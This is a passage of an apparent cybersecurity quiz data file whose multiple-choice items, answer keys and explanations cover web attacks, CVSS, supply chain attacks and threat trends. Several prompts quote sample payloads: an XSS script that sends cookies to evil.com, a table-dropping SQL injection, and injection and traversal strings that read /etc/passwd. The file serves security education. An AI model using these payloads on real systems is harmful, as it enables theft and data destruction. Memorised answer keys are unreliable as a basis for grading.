          "Quid pro quo attacks offer a service or benefit in exchange for information or access. The attacker provides something of perceived value (tech support, a gift, access to a resource) and requests sensitive information in return, exploiting the principle of reciprocity.",
      },
    ],
  },
  {
    topicName: "Social Engineering",
    concept: "Security awareness training",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the most effective organizational defense against social engineering attacks?",
        choices: [
          "Regular security awareness training and simulated phishing exercises",
          "Installing more firewalls at the network perimeter",
          "Implementing full-disk encryption on all devices",
          "Increasing the complexity requirements for passwords",
        ],
        correctAnswer:
          "Regular security awareness training and simulated phishing exercises",
        explanation:
          "Since social engineering targets human behavior rather than technology, the most effective defense is training employees to recognize and report suspicious activity. Simulated phishing campaigns reinforce training by providing realistic practice and measuring improvement over time.",
      },
    ],
  },

  // ─── Web Application Threats (13 nodes) ───

  {
    topicName: "Web Application Threats",
    concept: "SQL injection",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker submits `'; DROP TABLE users; --` into a search field, causing the application's database to delete the users table. What type of vulnerability was exploited?",
        choices: [
          "SQL injection",
          "Cross-site scripting (XSS)",
          "Cross-site request forgery (CSRF)",
          "Server-side request forgery (SSRF)",
        ],
        correctAnswer: "SQL injection",
        explanation:
          "SQL injection occurs when untrusted input is incorporated directly into SQL queries without proper sanitization. Parameterized queries (prepared statements) and input validation are the primary defenses. The OWASP Top 10 consistently ranks injection attacks among the most critical web application risks.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "Cross-site scripting (XSS)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker injects `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` into a comment field on a web application. What type of attack is this?",
        choices: [
          "Cross-site scripting (XSS)",
          "SQL injection",
          "CSRF",
          "Directory traversal",
        ],
        correctAnswer: "Cross-site scripting (XSS)",
        explanation:
          "XSS allows attackers to inject malicious scripts into web pages viewed by other users. The script executes in the victim's browser context, enabling session hijacking, cookie theft, and defacement. Output encoding, Content Security Policy (CSP), and input validation are key defenses.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "Cross-site request forgery (CSRF)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A user is logged into their banking site. They visit a malicious page that contains a hidden form that submits a transfer request to the bank using the user's authenticated session. What attack is this?",
        choices: [
          "Cross-site request forgery (CSRF)",
          "Cross-site scripting (XSS)",
          "SQL injection",
          "Clickjacking",
        ],
        correctAnswer: "Cross-site request forgery (CSRF)",
        explanation:
          "CSRF tricks an authenticated user's browser into sending an unintended request to a web application. Because the browser automatically includes session cookies, the application processes the request as if the user initiated it. Anti-CSRF tokens and SameSite cookie attributes are primary defenses.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "Server-side request forgery (SSRF)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker manipulates a web application into making HTTP requests to internal services that are not accessible from the internet. What type of vulnerability is this?",
        choices: [
          "Server-side request forgery (SSRF)",
          "Cross-site scripting (XSS)",
          "SQL injection",
          "Open redirect",
        ],
        correctAnswer: "Server-side request forgery (SSRF)",
        explanation:
          "SSRF occurs when an attacker can cause a server to make requests to unintended locations, such as internal services, cloud metadata endpoints (e.g., 169.254.169.254), or other backend systems. It can lead to internal network scanning, data exposure, and remote code execution.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "Insecure deserialization",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker modifies a serialized Java object in a cookie to execute arbitrary code on the server when it is deserialized. What vulnerability is being exploited?",
        choices: [
          "Insecure deserialization",
          "SQL injection",
          "Buffer overflow",
          "Path traversal",
        ],
        correctAnswer: "Insecure deserialization",
        explanation:
          "Insecure deserialization occurs when an application deserializes untrusted data without proper validation, allowing attackers to manipulate object properties or execute arbitrary code. Defenses include avoiding deserialization of untrusted data, using allowlists for acceptable classes, and integrity checks.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "Broken authentication",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A web application uses sequential session IDs (session1, session2, session3), allowing an attacker to predict and hijack other users' sessions. What vulnerability category does this fall under?",
        choices: [
          "Broken authentication",
          "SQL injection",
          "Cross-site scripting",
          "Insecure direct object reference",
        ],
        correctAnswer: "Broken authentication",
        explanation:
          "Broken authentication encompasses weaknesses in session management and credential handling, including predictable session IDs, credential stuffing, weak password policies, and missing session timeouts. Strong session tokens, MFA, and secure credential storage are essential defenses.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "Security misconfiguration",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A web server is deployed with default administrator credentials, directory listing enabled, and detailed error messages exposed to users. What type of vulnerability is this?",
        choices: [
          "Security misconfiguration",
          "SQL injection",
          "Cross-site scripting",
          "Insecure deserialization",
        ],
        correctAnswer: "Security misconfiguration",
        explanation:
          "Security misconfiguration occurs when security settings are not properly implemented or maintained. Examples include default credentials, unnecessary services enabled, overly permissive CORS policies, and verbose error messages. Hardening guides and automated configuration scanning help prevent these issues.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "Directory traversal",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker requests `https://example.com/file?name=../../../etc/passwd` and the server returns the system's password file. What type of attack is this?",
        choices: [
          "Directory traversal (path traversal)",
          "SQL injection",
          "Cross-site request forgery",
          "DNS poisoning",
        ],
        correctAnswer: "Directory traversal (path traversal)",
        explanation:
          "Directory traversal exploits insufficient input validation to access files outside the intended directory by using sequences like `../`. This can expose sensitive system files, configuration files, and source code. Input sanitization and chroot jails are common defenses.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "OWASP Top 10",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the primary purpose of the OWASP Top 10?",
        choices: [
          "To raise awareness of the most critical web application security risks",
          "To provide a list of the ten best antivirus products",
          "To rank programming languages by security",
          "To certify web applications as secure",
        ],
        correctAnswer:
          "To raise awareness of the most critical web application security risks",
        explanation:
          "The OWASP Top 10 is a regularly updated consensus document that identifies the most critical security risks to web applications. It serves as an awareness tool and starting point for web application security, widely referenced in security standards and development practices.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "Clickjacking",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker overlays an invisible iframe of a banking website on top of a game page, tricking users into clicking buttons that unknowingly execute bank transactions. What type of attack is this?",
        choices: [
          "Clickjacking",
          "Cross-site scripting",
          "Phishing",
          "DNS spoofing",
        ],
        correctAnswer: "Clickjacking",
        explanation:
          "Clickjacking (UI redressing) tricks users into clicking on hidden elements by overlaying transparent or opaque layers over legitimate pages. The X-Frame-Options header and Content Security Policy's frame-ancestors directive are the primary defenses against clickjacking.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "XML External Entity (XXE) attacks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker submits an XML document containing a reference to an external entity that reads files from the server's filesystem. What type of attack is this?",
        choices: [
          "XML External Entity (XXE) injection",
          "SQL injection",
          "Cross-site scripting",
          "LDAP injection",
        ],
        correctAnswer: "XML External Entity (XXE) injection",
        explanation:
          "XXE attacks exploit XML parsers that process external entity references. Attackers can use XXE to read local files, perform SSRF, or cause denial of service. Disabling external entity processing in XML parsers is the primary defense.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "API security risks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An API endpoint returns full user records including sensitive fields when only a user's name was requested. What type of API security issue is this?",
        choices: [
          "Excessive data exposure",
          "SQL injection",
          "Broken authentication",
          "Rate limiting failure",
        ],
        correctAnswer: "Excessive data exposure",
        explanation:
          "Excessive data exposure occurs when APIs return more data than needed, relying on the client to filter sensitive fields. Attackers can intercept the full response to access sensitive data. APIs should return only the minimum required data and apply server-side filtering.",
      },
    ],
  },
  {
    topicName: "Web Application Threats",
    concept: "Command injection",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker enters `; cat /etc/passwd` into a web form field that passes user input directly to an operating system command. What type of attack is this?",
        choices: [
          "Command injection (OS command injection)",
          "SQL injection",
          "Cross-site scripting",
          "LDAP injection",
        ],
        correctAnswer: "Command injection (OS command injection)",
        explanation:
          "Command injection occurs when an application passes untrusted user input to a system shell command without proper sanitization. Attackers can execute arbitrary operating system commands on the server. Using parameterized APIs instead of shell commands is the strongest defense.",
      },
    ],
  },

  // ─── CVE & CVSS (12 nodes) ───

  {
    topicName: "CVE & CVSS",
    concept: "CVE identifiers",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What does a CVE (Common Vulnerabilities and Exposures) identifier provide?",
        choices: [
          "A standardized unique identifier for a publicly known security vulnerability",
          "A severity score that ranks the danger of a vulnerability",
          "A patch that fixes the identified vulnerability",
          "A list of all systems affected by the vulnerability",
        ],
        correctAnswer:
          "A standardized unique identifier for a publicly known security vulnerability",
        explanation:
          "CVE provides a standardized naming system for publicly known vulnerabilities. Each CVE ID (e.g., CVE-2021-44228) uniquely identifies a specific vulnerability, enabling organizations, vendors, and researchers to communicate about the same issue without ambiguity.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "CVSS overview",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the primary purpose of the Common Vulnerability Scoring System (CVSS)?",
        choices: [
          "To provide a standardized numerical score representing the severity of a vulnerability",
          "To assign unique identifiers to newly discovered vulnerabilities",
          "To automatically patch vulnerabilities on affected systems",
          "To track the number of times a vulnerability has been exploited",
        ],
        correctAnswer:
          "To provide a standardized numerical score representing the severity of a vulnerability",
        explanation:
          "CVSS provides a framework for scoring vulnerabilities on a scale of 0.0 to 10.0 based on their characteristics. The score helps organizations prioritize remediation efforts by objectively comparing the severity of different vulnerabilities.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "CVSS base score metrics",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "In CVSS, the base score is derived from which two metric groups?",
        choices: [
          "Exploitability metrics and Impact metrics",
          "Financial metrics and Legal metrics",
          "Network metrics and Storage metrics",
          "Compliance metrics and Audit metrics",
        ],
        correctAnswer: "Exploitability metrics and Impact metrics",
        explanation:
          "The CVSS base score combines Exploitability metrics (attack vector, attack complexity, privileges required, user interaction) and Impact metrics (confidentiality, integrity, availability impact). These reflect the intrinsic characteristics of the vulnerability that remain constant over time.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "CVSS severity ratings",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "A vulnerability has a CVSS base score of 9.8. What is its qualitative severity rating?",
        choices: [
          "Critical",
          "High",
          "Medium",
          "Low",
        ],
        correctAnswer: "Critical",
        explanation:
          "CVSS v3 maps numerical scores to qualitative ratings: None (0.0), Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9), and Critical (9.0-10.0). A score of 9.8 indicates a critical vulnerability that should be prioritized for immediate remediation.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "Attack vector in CVSS",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "In CVSS, if a vulnerability can be exploited from anywhere on the internet without any prior access, what is its attack vector classification?",
        choices: [
          "Network",
          "Adjacent",
          "Local",
          "Physical",
        ],
        correctAnswer: "Network",
        explanation:
          "The CVSS attack vector metric describes how an attacker can exploit the vulnerability. 'Network' means it can be exploited remotely over the internet. 'Adjacent' requires the same network segment. 'Local' requires local access. 'Physical' requires physical interaction with the device.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "Vulnerability databases (NVD)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the National Vulnerability Database (NVD)?",
        choices: [
          "A U.S. government repository of vulnerability data that includes CVSS scores, affected products, and remediation guidance",
          "A private database of zero-day exploits sold to nation-states",
          "A social media platform for security researchers to discuss vulnerabilities",
          "A certification body that validates the security of commercial products",
        ],
        correctAnswer:
          "A U.S. government repository of vulnerability data that includes CVSS scores, affected products, and remediation guidance",
        explanation:
          "The NVD, maintained by NIST, is the U.S. government's comprehensive vulnerability database. It enriches CVE entries with CVSS scores, affected product listings (CPE), and references to patches and advisories, serving as a critical resource for vulnerability management.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "Zero-day vulnerabilities",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What defines a zero-day vulnerability?",
        choices: [
          "A vulnerability that is unknown to the software vendor and has no available patch",
          "A vulnerability that was discovered exactly zero days ago",
          "A vulnerability that only affects systems with zero security controls",
          "A vulnerability with a CVSS score of 0.0",
        ],
        correctAnswer:
          "A vulnerability that is unknown to the software vendor and has no available patch",
        explanation:
          "A zero-day vulnerability is a flaw unknown to the vendor or for which no patch exists. The term 'zero-day' refers to the vendor having had zero days to fix the issue. Zero-day exploits are extremely valuable to attackers because defenses cannot specifically protect against unknown threats.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "Vulnerability scanning",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the primary purpose of a vulnerability scanner like Nessus or Qualys?",
        choices: [
          "To automatically identify known vulnerabilities in systems, applications, and network devices",
          "To block incoming network attacks in real time",
          "To encrypt all data stored on the scanned systems",
          "To create backups of vulnerable systems before patching",
        ],
        correctAnswer:
          "To automatically identify known vulnerabilities in systems, applications, and network devices",
        explanation:
          "Vulnerability scanners probe systems for known vulnerabilities by checking software versions, configurations, and exposures against vulnerability databases. They produce reports that prioritize findings by severity, helping organizations focus remediation efforts on the most critical issues.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "Patch management",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the primary goal of a patch management program?",
        choices: [
          "To systematically apply software updates that fix known vulnerabilities in a timely manner",
          "To develop custom patches for proprietary software",
          "To monitor employee internet usage",
          "To backup all systems before making any changes",
        ],
        correctAnswer:
          "To systematically apply software updates that fix known vulnerabilities in a timely manner",
        explanation:
          "Patch management is the process of identifying, testing, and deploying software updates to remediate vulnerabilities. A structured patch management program reduces the window of exposure by ensuring critical patches are applied promptly while minimizing disruption to operations.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "Responsible disclosure",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "In responsible disclosure, what should a security researcher do after discovering a vulnerability in a vendor's product?",
        choices: [
          "Report the vulnerability privately to the vendor and allow time for a patch before public disclosure",
          "Immediately publish the vulnerability details on social media",
          "Sell the vulnerability to the highest bidder on the dark web",
          "Exploit the vulnerability to demonstrate its severity",
        ],
        correctAnswer:
          "Report the vulnerability privately to the vendor and allow time for a patch before public disclosure",
        explanation:
          "Responsible disclosure (coordinated disclosure) involves privately notifying the vendor about a vulnerability, giving them a reasonable timeframe (typically 90 days) to develop and release a patch before the details are made public. This balances transparency with user protection.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "Exploit databases",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the Exploit Database (Exploit-DB) primarily used for?",
        choices: [
          "A public archive of known exploits and proof-of-concept code for security research and penetration testing",
          "A marketplace for selling zero-day exploits to governments",
          "A tool for automatically exploiting vulnerable systems",
          "A database of security certifications and compliance requirements",
        ],
        correctAnswer:
          "A public archive of known exploits and proof-of-concept code for security research and penetration testing",
        explanation:
          "Exploit-DB is a publicly accessible repository of exploits and proof-of-concept code, maintained by Offensive Security. Security researchers and penetration testers use it to find exploit code for known vulnerabilities, and defenders use it to understand how vulnerabilities can be exploited.",
      },
    ],
  },
  {
    topicName: "CVE & CVSS",
    concept: "Vulnerability lifecycle",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the correct order of the typical vulnerability lifecycle?",
        choices: [
          "Discovery, Disclosure, Patch development, Patch deployment",
          "Patch deployment, Discovery, Disclosure, Patch development",
          "Disclosure, Patch deployment, Discovery, Patch development",
          "Patch development, Patch deployment, Discovery, Disclosure",
        ],
        correctAnswer:
          "Discovery, Disclosure, Patch development, Patch deployment",
        explanation:
          "The vulnerability lifecycle begins with discovery (finding the flaw), followed by disclosure (reporting it to the vendor), patch development (the vendor creating a fix), and patch deployment (users applying the fix). The time between disclosure and deployment is the window of vulnerability.",
      },
    ],
  },

  // ─── Supply Chain Attacks (12 nodes) ───

  {
    topicName: "Supply Chain Attacks",
    concept: "Supply chain attack definition",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is a supply chain attack in cybersecurity?",
        choices: [
          "An attack that targets a less-secure element in the supply chain to compromise the ultimate target",
          "An attack that only targets physical shipping and logistics companies",
          "An attack that exploits vulnerabilities in blockchain technology",
          "An attack that targets end users directly through phishing emails",
        ],
        correctAnswer:
          "An attack that targets a less-secure element in the supply chain to compromise the ultimate target",
        explanation:
          "Supply chain attacks compromise a trusted third party — such as a software vendor, service provider, or hardware manufacturer — to gain access to the attacker's true targets. Because organizations trust their suppliers, these attacks bypass many security controls.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "SolarWinds attack",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "The 2020 SolarWinds attack is a landmark example of what type of cybersecurity threat?",
        choices: [
          "Software supply chain attack via a trojanized update",
          "Distributed denial-of-service (DDoS) attack",
          "Physical security breach at a data center",
          "SQL injection against a web application",
        ],
        correctAnswer:
          "Software supply chain attack via a trojanized update",
        explanation:
          "The SolarWinds attack involved threat actors (attributed to a nation-state) inserting malicious code into the Orion software build process. Approximately 18,000 organizations downloaded the compromised update, giving the attackers access to government agencies and major corporations.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "Software dependency attacks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker publishes a malicious package to a public registry (like npm or PyPI) with a name similar to a popular library, hoping developers will install it by mistake. What is this technique called?",
        choices: [
          "Typosquatting (dependency confusion)",
          "DNS hijacking",
          "ARP spoofing",
          "Session fixation",
        ],
        correctAnswer: "Typosquatting (dependency confusion)",
        explanation:
          "Typosquatting in package registries involves publishing malicious packages with names similar to popular libraries (e.g., 'reqeusts' instead of 'requests'). Dependency confusion is a related attack where a public package with the same name as a private internal package is substituted during the build process.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "Hardware supply chain risks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Which of the following is a hardware supply chain risk?",
        choices: [
          "Malicious chips or firmware implanted in hardware components during manufacturing",
          "A user choosing a weak password for their laptop",
          "A DDoS attack overwhelming a web server",
          "An employee accidentally sending an email to the wrong recipient",
        ],
        correctAnswer:
          "Malicious chips or firmware implanted in hardware components during manufacturing",
        explanation:
          "Hardware supply chain risks include the insertion of malicious components, firmware backdoors, or counterfeit parts during manufacturing or distribution. These are extremely difficult to detect and can provide persistent, stealthy access to compromised systems.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "Third-party vendor risk",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An organization's data is breached because a third-party vendor with network access had weak security controls. What does this scenario illustrate?",
        choices: [
          "Third-party vendor risk",
          "Insider trading",
          "Network congestion",
          "Software licensing violation",
        ],
        correctAnswer: "Third-party vendor risk",
        explanation:
          "Third-party vendor risk arises when organizations grant network access, data access, or integration points to external vendors whose security posture may be weaker. Vendor risk management programs include security assessments, contractual requirements, and ongoing monitoring of vendor security practices.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "Software Bill of Materials (SBOM)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is a Software Bill of Materials (SBOM)?",
        choices: [
          "A comprehensive inventory of all components, libraries, and dependencies used in a piece of software",
          "A financial report detailing software development costs",
          "A list of all employees who contributed to the software",
          "A marketing document describing software features",
        ],
        correctAnswer:
          "A comprehensive inventory of all components, libraries, and dependencies used in a piece of software",
        explanation:
          "An SBOM is a formal record of the components in a software product, including open-source libraries, versions, and licensing. It enables organizations to quickly identify whether they are affected when a vulnerability is discovered in a dependency, improving supply chain transparency.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "Code signing",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the primary purpose of code signing in software distribution?",
        choices: [
          "To verify that software has not been tampered with and comes from a trusted publisher",
          "To encrypt the software so only paying customers can use it",
          "To compress the software for faster downloads",
          "To translate the software into multiple languages",
        ],
        correctAnswer:
          "To verify that software has not been tampered with and comes from a trusted publisher",
        explanation:
          "Code signing uses digital signatures to confirm the authenticity and integrity of software. When code is signed, users and systems can verify that the software was published by the claimed developer and has not been modified since signing. Compromised signing keys are a critical supply chain risk.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "Build pipeline security",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Why is securing the CI/CD (Continuous Integration/Continuous Deployment) pipeline critical for preventing supply chain attacks?",
        choices: [
          "Because compromised build pipelines can inject malicious code into software distributed to all users",
          "Because CI/CD pipelines are only used for testing, not production",
          "Because build pipelines never have access to production credentials",
          "Because CI/CD pipelines are disconnected from the internet",
        ],
        correctAnswer:
          "Because compromised build pipelines can inject malicious code into software distributed to all users",
        explanation:
          "CI/CD pipelines automate software building, testing, and deployment. If an attacker compromises the pipeline, they can inject malicious code that gets distributed to all users as a legitimate update — exactly what happened in the SolarWinds attack. Pipeline security includes access controls, integrity checks, and build reproducibility.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "Open-source supply chain risks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Why does heavy reliance on open-source software create supply chain risks?",
        choices: [
          "Because open-source projects may have maintainers with compromised accounts, abandoned maintenance, or unreviewed contributions",
          "Because open-source software is always less secure than commercial software",
          "Because open-source licenses prevent security patching",
          "Because open-source software cannot be vulnerability scanned",
        ],
        correctAnswer:
          "Because open-source projects may have maintainers with compromised accounts, abandoned maintenance, or unreviewed contributions",
        explanation:
          "Open-source supply chain risks include compromised maintainer accounts, dependency on under-resourced projects, and malicious contributions that pass code review. The event-stream npm incident demonstrated how an attacker gained maintainer access to a popular package and injected cryptocurrency-stealing malware.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "Managed service provider (MSP) attacks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Why are managed service providers (MSPs) attractive targets for supply chain attacks?",
        choices: [
          "Because compromising one MSP can give an attacker access to all of the MSP's customers simultaneously",
          "Because MSPs never use encryption for their services",
          "Because MSPs only serve small businesses with no valuable data",
          "Because MSPs are not subject to any security regulations",
        ],
        correctAnswer:
          "Because compromising one MSP can give an attacker access to all of the MSP's customers simultaneously",
        explanation:
          "MSPs manage IT infrastructure for multiple clients, often with privileged access to their networks and systems. Compromising an MSP is a force multiplier — attackers can pivot from the MSP into many client environments simultaneously, as demonstrated in the Kaseya VSA attack in 2021.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "Firmware attacks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What makes firmware-level attacks particularly dangerous compared to software-level attacks?",
        choices: [
          "Firmware runs below the operating system, making it persistent across OS reinstalls and difficult to detect with traditional security tools",
          "Firmware attacks can only target mobile phones",
          "Firmware attacks are easily detected by antivirus software",
          "Firmware is updated more frequently than software, providing more attack opportunities",
        ],
        correctAnswer:
          "Firmware runs below the operating system, making it persistent across OS reinstalls and difficult to detect with traditional security tools",
        explanation:
          "Firmware operates at a lower level than the operating system, controlling hardware initialization and basic functions. Malware embedded in firmware survives OS reinstalls and disk reformatting, and most security tools cannot inspect firmware. UEFI Secure Boot and firmware integrity monitoring help mitigate this risk.",
      },
    ],
  },
  {
    topicName: "Supply Chain Attacks",
    concept: "Vendor security assessments",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the purpose of conducting a vendor security assessment before engaging a third-party provider?",
        choices: [
          "To evaluate the vendor's security controls and practices to determine the risk they may introduce to the organization",
          "To test the vendor's products for performance benchmarking",
          "To negotiate lower pricing for the vendor's services",
          "To verify the vendor's financial stability and credit rating",
        ],
        correctAnswer:
          "To evaluate the vendor's security controls and practices to determine the risk they may introduce to the organization",
        explanation:
          "Vendor security assessments evaluate a third party's security posture before granting access to systems or data. Methods include security questionnaires, SOC 2 report reviews, penetration test results, and on-site audits. This due diligence is essential for managing supply chain risk.",
      },
    ],
  },

  // ─── Current Threat Trends (13 nodes) ───

  {
    topicName: "Current Threat Trends",
    concept: "Ransomware-as-a-Service (RaaS)",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is Ransomware-as-a-Service (RaaS)?",
        choices: [
          "A business model where ransomware developers lease their malware to affiliates in exchange for a share of ransom payments",
          "A legitimate cloud service for backing up data to prevent ransomware",
          "A government program to help organizations recover from ransomware attacks",
          "A security tool that automatically decrypts ransomware-encrypted files",
        ],
        correctAnswer:
          "A business model where ransomware developers lease their malware to affiliates in exchange for a share of ransom payments",
        explanation:
          "RaaS operates like a franchise model: developers create and maintain the ransomware platform, while affiliates carry out the actual attacks. This lowers the barrier to entry for cybercriminals and has dramatically increased the volume and sophistication of ransomware attacks.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "Double extortion ransomware",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "In a double extortion ransomware attack, what do attackers do in addition to encrypting the victim's data?",
        choices: [
          "Exfiltrate the data and threaten to publish it unless the ransom is paid",
          "Encrypt the backups but leave the primary data intact",
          "Report the victim to regulatory authorities",
          "Demand two separate ransoms using two different cryptocurrencies",
        ],
        correctAnswer:
          "Exfiltrate the data and threaten to publish it unless the ransom is paid",
        explanation:
          "Double extortion adds data theft to the traditional encryption attack. Even if the victim can restore from backups, the attacker threatens to leak sensitive data publicly. This puts additional pressure on victims, particularly those subject to data privacy regulations.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "AI-powered attacks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "How are threat actors leveraging artificial intelligence to enhance their attacks?",
        choices: [
          "Using AI to generate convincing phishing emails, deepfake audio/video, and automate vulnerability discovery",
          "Using AI exclusively to mine cryptocurrency",
          "Using AI only to improve their own defensive security",
          "Using AI to comply with privacy regulations",
        ],
        correctAnswer:
          "Using AI to generate convincing phishing emails, deepfake audio/video, and automate vulnerability discovery",
        explanation:
          "Threat actors use AI to craft more convincing phishing messages with fewer grammatical errors, create deepfake audio and video for impersonation, automate reconnaissance and vulnerability scanning, and develop polymorphic malware that evades detection. AI lowers the skill barrier for sophisticated attacks.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "Cloud security threats",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is one of the most common causes of cloud security breaches?",
        choices: [
          "Misconfigured cloud storage buckets or access policies that expose data publicly",
          "Physical theft of cloud data center servers",
          "Cloud providers refusing to apply security patches",
          "The inherent insecurity of all cloud encryption algorithms",
        ],
        correctAnswer:
          "Misconfigured cloud storage buckets or access policies that expose data publicly",
        explanation:
          "Cloud misconfigurations — such as publicly accessible S3 buckets, overly permissive IAM roles, and exposed databases — are a leading cause of data breaches. The shared responsibility model means customers are responsible for configuring their cloud resources securely.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "IoT security challenges",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "Why do Internet of Things (IoT) devices present significant cybersecurity challenges?",
        choices: [
          "Many IoT devices have limited processing power for security, use default credentials, and receive infrequent firmware updates",
          "IoT devices are always air-gapped from the internet",
          "IoT devices use military-grade encryption by default",
          "IoT devices are too inexpensive to be targeted by attackers",
        ],
        correctAnswer:
          "Many IoT devices have limited processing power for security, use default credentials, and receive infrequent firmware updates",
        explanation:
          "IoT devices often ship with default passwords, lack encryption, have limited compute for security functions, and rarely receive updates. The Mirai botnet demonstrated how easily IoT devices with default credentials can be compromised and weaponized for massive DDoS attacks.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "Zero trust architecture",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What is the core principle of a zero trust security architecture?",
        choices: [
          "Never trust, always verify — authenticate and authorize every access request regardless of location",
          "Trust all users inside the corporate network perimeter",
          "Trust all cloud-based services automatically",
          "Only verify access for external contractors, not employees",
        ],
        correctAnswer:
          "Never trust, always verify — authenticate and authorize every access request regardless of location",
        explanation:
          "Zero trust eliminates the concept of a trusted internal network. Every access request is verified based on identity, device health, and context, regardless of whether the user is inside or outside the corporate network. This model addresses threats from lateral movement and compromised credentials.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "Credential stuffing",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "An attacker uses millions of username/password pairs from previous data breaches to attempt logins across multiple websites. What is this attack called?",
        choices: [
          "Credential stuffing",
          "Brute force attack",
          "Password spraying",
          "Rainbow table attack",
        ],
        correctAnswer: "Credential stuffing",
        explanation:
          "Credential stuffing exploits password reuse by testing stolen credentials from one breach against other services. Unlike brute force (trying many passwords for one account), credential stuffing uses known valid credential pairs. MFA and monitoring for unusual login patterns are key defenses.",
      },
    ],
  },
  {
    topicName: "Current Threat Trends",
    concept: "Living-off-the-land attacks",
    questionTemplates: [
      {
        type: "recognition",
        prompt:
          "What does it mean when an attacker uses 'living-off-the-land' techniques?",
        choices: [
          "The attacker uses legitimate system tools (like PowerShell, WMI, or certutil) for malicious purposes to avoid detection",
          "The attacker sets up their own infrastructure in the victim's physical office",
          "The attacker only targets agricultural organizations",
          "The attacker uses exclusively open-source hacking tools",
        ],
        correctAnswer:
          "The attacker uses legitimate system tools (like PowerShell, WMI, or certutil) for malicious purposes to avoid detection",
        explanation:
